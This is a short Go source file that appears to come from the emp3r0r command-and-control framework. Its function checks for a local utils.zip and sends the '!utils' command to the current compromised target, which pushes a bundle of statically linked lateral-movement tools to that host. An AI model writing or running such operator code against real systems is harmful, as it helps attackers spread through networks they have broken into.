package cc

import "github.com/jm33-m0/emp3r0r/core/internal/agent"

// upload a zip file that packs several lateral-movement tools
// statically linked, built under alpine
func moduleUtils() {
	if !agent.IsFileExist("utils.zip") {
		CliPrintError("[-] utils.zip not found, aborting")
		return
	}

	err := SendCmd("!utils", CurrentTarget)
	if err != nil {
		CliPrintError("[-] SendCmd failed: %v", err)
	}
}
